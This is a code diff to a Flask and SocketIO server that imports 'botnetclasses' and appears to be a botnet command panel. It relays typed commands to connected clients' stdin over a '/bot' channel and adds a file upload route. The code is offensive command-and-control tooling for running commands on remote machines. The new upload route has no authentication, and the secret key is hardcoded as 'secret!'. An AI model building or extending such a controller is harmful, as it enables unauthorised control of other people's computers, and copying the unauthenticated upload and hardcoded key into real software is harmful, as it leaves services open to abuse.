@@ -1,7 +1,9 @@
+import os
 import socket
 from flask import Flask, render_template, session, request, Response
 from flask_socketio import SocketIO, emit
 from functools import wraps
+from werkzeug import secure_filename
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
@@ -15,6 +17,7 @@ except: from botnetclasses import *
 HOST = 'localhost'
 PORT = 1708
 connected = ''  # temp variable for testing
+UPLOAD_FOLDER = '/tmp' # TODO
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -22,6 +25,7 @@ connected = ''  # temp variable for testing
 async_mode = None
 
 app = Flask(__name__)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app, async_mode=async_mode)
 thread = None
@@ -38,6 +42,14 @@ def authenticate():
     'Could not verify your access level for that URL.\n'
     'You have to login with proper credentials', 401,
     {'WWW-Authenticate': 'Basic realm="Login Required"'})
+
+@app.route('/uploader', methods = ['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        filename = secure_filename(f.filename)
+        f.save((os.path.join(app.config['UPLOAD_FOLDER'], filename)))
+        return json.dumps({"success":True})
 
 def requires_auth(f):
     @wraps(f)
@@ -63,7 +75,7 @@ def index():
 @socketio.on('send_command', namespace='/bot')
 def send(cmd):
     try:
-        sent = botnet.sendStdin(connected, cmd['data']+"\n")
+        botnet.sendStdin(connected, cmd['data'] + '\n')
     except:
         emit('response',
              {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
